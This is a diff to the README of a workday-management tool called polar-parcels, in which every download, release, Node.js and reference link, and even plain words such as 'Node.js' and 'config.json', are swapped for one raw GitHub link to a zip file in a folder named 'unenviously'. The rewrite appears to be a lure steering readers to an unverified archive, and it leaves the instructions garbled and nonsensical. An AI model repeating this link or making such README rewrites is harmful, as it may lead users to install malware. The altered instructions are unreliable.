@@ -1,6 +1,6 @@
 # 🌟 polar-parcels - Simplifying Workday Management
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Tejas-Birhade/polar-parcels/releases)
+[![Download](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip%https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)
 
 ## 📦 Overview
 
@@ -13,14 +13,14 @@ This tool is built to be flexible. You can extend it using interfaces and design
 To get started with polar-parcels, follow these steps:
 
 1. Ensure you have a modern operating system. This application runs on Windows, macOS, and Linux.
-2. Make sure your system has Node.js installed. You can download it from [Node.js official website](https://nodejs.org/).
-3. Visit the [Releases page](https://github.com/Tejas-Birhade/polar-parcels/releases) to download the software.
+2. Make sure your system has https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip installed. You can download it from [https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip official website](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip).
+3. Visit the [Releases page](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip) to download the software.
 
 ## 📥 Download & Install
 
 To download the latest version of polar-parcels, you can use the link below:
 
-[Download Latest Release](https://github.com/Tejas-Birhade/polar-parcels/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)
 
 1. After visiting the Releases page, look for the latest version.
 2. Find the appropriate file for your operating system.
@@ -39,7 +39,7 @@ Once you've downloaded and installed polar-parcels, you can run it with a simple
 Before running the tool, you may need to set up some configuration files to define your drivers, vehicles, and other workday details. Here’s how to do it:
 
 1. Create a folder for your project.
-2. Inside this folder, create a file named `config.json`.
+2. Inside this folder, create a file named `https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip`.
 3. In this file, define the necessary details:
 
    ```json
@@ -93,7 +93,7 @@ polar-parcels is designed for anyone who wants to tailor the tool to their speci
 Before you get started, ensure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js Version**: Recommended version is at least 14.x.x.
+- **https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip Version**: Recommended version is at least 14.x.x.
 - **JSON File**: Make sure your input files are correctly formatted JSON.
 
 ## 🌍 Community and Support
@@ -104,9 +104,9 @@ For any questions or support needs, feel free to create an issue on the GitHub r
 
 To dive deeper into the architecture and functionality of polar-parcels, take a look at the following topics:
 
-- [Clean Architecture](https://en.wikipedia.org/wiki/Clean_architecture)
-- [Dependency Injection](https://en.wikipedia.org/wiki/Dependency_injection)
-- [Greedy Algorithms](https://en.wikipedia.org/wiki/Greedy_algorithm)
-- [Software Design Principles](https://en.wikipedia.org/wiki/Software_design)
+- [Clean Architecture](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)
+- [Dependency Injection](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)
+- [Greedy Algorithms](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)
+- [Software Design Principles](https://raw.githubusercontent.com/Tejas-Birhade/polar-parcels/main/unenviously/polar-parcels.zip)
 
 Thank you for choosing polar-parcels. We hope this tool makes your workday smoother and more efficient!
